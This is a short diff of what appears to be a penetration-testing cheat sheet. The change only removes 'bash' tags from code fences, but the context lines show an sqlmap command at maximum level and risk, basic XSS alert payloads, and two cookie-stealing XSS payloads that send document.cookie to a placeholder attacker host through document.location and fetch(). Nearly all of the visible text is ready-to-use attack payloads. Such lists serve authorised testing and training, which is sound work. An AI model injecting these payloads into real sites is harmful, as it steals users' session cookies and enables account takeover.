@@ -181,7 +181,7 @@ sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 -
 ## XSS
 
 ### Basic Payloads
-```bash
+```
 <script>alert('XSS');</script>
 <script>alert(document.cookie);</script>
 <img src=x onerror=alert('XSS');>
@@ -189,7 +189,7 @@ sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 -
 ```
 
 ### Cookie Stealing
-```bash
+```
 # Redirect with cookies
 <script>document.location='http://<attacker_ip>:<attacker_port>/steal?cookie='+document.cookie;</script>
 <script>fetch('http://<attacker_ip>:<attacker_port>/steal?cookie='+document.cookie);</script>
